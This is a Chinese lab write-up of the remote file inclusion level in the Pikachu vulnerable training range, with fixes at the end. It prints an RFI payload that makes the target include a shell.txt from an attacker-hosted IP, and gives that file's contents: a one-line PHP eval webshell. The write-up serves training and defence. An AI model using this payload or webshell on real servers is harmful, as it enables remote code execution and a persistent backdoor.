# Pikachu | 文件包含 远程文件包含 RFI
## 一、漏洞简介
PHP配置allow_url_include开启时，可以包含远程服务器上的文件，远程代码执行。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/fileinclude/fi_remote.php
## 三、复现步骤
1. 自己搭建一个web服务器，放一句话木马 txt 文件
2. payload：`?filename=http://你的ip/shell.txt`
3. 远程文件被include解析，木马执行
## 四、Payload
`?filename=http://192.168.1.100/shell.txt`
shell.txt内容：`<?php @eval($_POST['pass']);?>`
## 五、漏洞原理
allow_url_include=On，include支持http协议加载远程资源。
## 六、修复方案
关闭allow_url_include；过滤http://、https://协议；白名单。
## 七、总结
远程包含危害极大，直接拿shell，现在新版PHP默认关闭这个选项。